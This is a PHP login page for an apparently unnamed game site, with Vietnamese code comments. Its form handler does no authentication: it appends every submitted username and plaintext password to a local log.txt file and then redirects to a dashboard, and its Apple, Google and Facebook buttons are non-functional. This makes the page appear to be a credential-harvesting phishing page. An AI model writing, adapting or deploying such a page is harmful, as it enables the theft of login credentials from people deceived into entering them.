<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Lay thong tin login vao file log.txt
    $logData = date("Y-m-d H:i:s") . " - Username: $username, Password: $password\n";
    file_put_contents("log.txt", $logData, FILE_APPEND);

    // chuyen huong sang trang can launch game
    header("Location: dashboard.php");
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="login-container">
        <img src="logo.jpg" alt="Logo" class="logo">
        <form action="login.php" method="POST">
            <input type="text" name="username" placeholder="Username, Phone, or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            <div class="options">
                <label><input type="checkbox" name="remember"> Remember me</label>
                <a href="#">Forgot Password?</a>
            </div>
            <button type="submit">Log In</button>
            <div class="divider">OR</div>
            <button type="button" class="social apple">Log in with Apple</button>
            <button type="button" class="social google">Log in with Google</button>
            <button type="button" class="social facebook">Log in with Facebook</button>
            <p>New? <a href="#">Sign up</a> and start playing!</p>
        </form>
    </div>
</body>
</html>

